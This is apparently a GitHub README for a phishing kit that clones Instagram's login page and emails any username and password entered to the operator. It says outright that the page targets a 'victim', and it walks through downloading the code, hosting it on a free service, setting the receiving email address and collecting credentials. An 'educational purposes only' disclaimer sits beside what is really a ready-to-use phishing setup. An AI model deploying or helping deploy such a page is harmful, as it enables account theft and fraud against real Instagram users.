# Insta-login
Instagram login page clone which send your victim's credentials through email.</br>
The webpage works on both **mobile** web browsers & **desktop**.<br/>


❗ **Do not forget to not use it for malicious purposes, it's only for educational purposes.
You are solely responsible for your actions, that's obviously not me.**<br/>
</br>
</br>

## 🚀 Getting started

* Get the source [code](https://github.com/Abhijeetbyte/insta-login/archive/refs/heads/main.zip)

* Extract the zip and uploade the website on your hosting server
  - Here i am using **000webhost.com** it's free and allow sending emails too.

![img](images/email-check.png)

* Change receiving email address</br>

  - ![img](images/email-php_LI.jpg)
</br>

### Webpage 
![Webpage](images/webpage-preview.png)

</br>

* As soon as someone enter **username** & **password** and click on **Log In** button, you will receive an email</br>

  - ![img](images/received-email.png)
